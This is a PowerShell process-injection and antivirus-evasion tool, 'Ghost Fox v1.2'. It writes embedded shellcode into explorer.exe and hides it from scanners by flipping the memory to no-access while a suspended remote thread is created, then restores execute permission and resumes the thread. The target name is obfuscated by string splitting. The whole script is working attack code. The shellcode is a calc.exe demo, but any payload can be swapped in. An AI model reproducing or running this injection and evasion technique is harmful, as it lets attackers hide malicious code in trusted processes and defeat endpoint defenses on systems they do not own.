# Ghost Fox v1.2 - Phantom Thread Edition
# NEW STRATEGY: Evade behavioral detection by manipulating memory permissions and suspending the thread during the scan window.

try {
    Write-Host "[INFO] Initializing Ghost Fox v1.2..." -ForegroundColor DarkCyan
    
    $decryptedScriptBlock = {
        # Define extended WinAPI functions, including VirtualProtectEx and ResumeThread
        $Win32Definitions = @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32.dll")] public static extern uint ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
    }
"@

        Add-Type -TypeDefinition $Win32Definitions -ErrorAction SilentlyContinue
    
        # Shellcode to launch calc.exe (position-independent)
        $shellcode = @(
            0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
            0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48,
            0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9,
            0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
            0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48,
            0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01,
            0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48,
            0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
            0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C,
            0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0,
            0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04,
            0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
            0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48,
            0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F,
            0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
            0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB,
            0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C,
            0x63, 0x2E, 0x65, 0x78, 0x65, 0x00
        )
        [byte[]]$shellcodeBytes = $shellcode

        $targetProcessName = ('exp' + 'lorer')
        $explorerProcess = Get-Process -Name $targetProcessName -ErrorAction Stop
        Write-Host "[INFO] Target acquired: $($explorerProcess.Id)" -ForegroundColor DarkCyan

        # --- GHOST FOX v1.2 TACTIC ---
        $PAGE_EXECUTE_READWRITE = 0x40
        $PAGE_NOACCESS = 0x01
        $CREATE_SUSPENDED = 0x00000004
        $MEM_COMMIT_RESERVE = 0x3000

        $hProcess = [Win32]::OpenProcess(0x1F0FFF, $false, $explorerProcess.Id)
        $allocAddress = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$shellcodeBytes.Length, $MEM_COMMIT_RESERVE, $PAGE_EXECUTE_READWRITE)
        
        $bytesWritten = [IntPtr]::Zero
        [Win32]::WriteProcessMemory($hProcess, $allocAddress, $shellcodeBytes, [uint32]$shellcodeBytes.Length, [ref]$bytesWritten) | Out-Null
        Write-Host "[INFO] Payload injected." -ForegroundColor DarkCyan

        # HIDE: Make the memory unreadable
        $oldProtect = 0
        [Win32]::VirtualProtectEx($hProcess, $allocAddress, [System.UIntPtr]::new([uint32]$shellcodeBytes.Length), $PAGE_NOACCESS, [ref]$oldProtect) | Out-Null
        Write-Host "[INFO] Payload hidden (PAGE_NO_ACCESS). Scanner evasion active." -ForegroundColor DarkYellow
        
        # CREATE SUSPENDED THREAD: This triggers the scan on the now-unreadable memory
        $remoteThreadId = 0
        $hRemoteThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $allocAddress, [IntPtr]::Zero, $CREATE_SUSPENDED, [ref]$remoteThreadId)
        Write-Host "[INFO] Phantom thread created in suspended state (ID: $remoteThreadId)." -ForegroundColor DarkCyan

        # WAIT: Give the scanner time to fail
        Write-Host "[INFO] Waiting for 3 seconds..." -ForegroundColor DarkYellow
        Start-Sleep -Seconds 3

        # REVEAL & RESUME: Restore permissions and wake the thread
        $PAGE_EXECUTE_READ = 0x20
        [Win32]::VirtualProtectEx($hProcess, $allocAddress, [System.UIntPtr]::new([uint32]$shellcodeBytes.Length), $PAGE_EXECUTE_READ, [ref]$oldProtect) | Out-Null
        [Win32]::ResumeThread($hRemoteThread) | Out-Null
        Write-Host "[SUCCESS] Thread resumed. Ghost is in the machine." -ForegroundColor Green
        
        # Clean up
        [Win32]::CloseHandle($hProcess) | Out-Null
        [Win32]::CloseHandle($hRemoteThread) | Out-Null
    }

    Invoke-Command -ScriptBlock $decryptedScriptBlock
    
} catch {
    Write-Host "[CRITICAL ERROR] Mission failed: $($_.Exception.Message)" -ForegroundColor Red
}
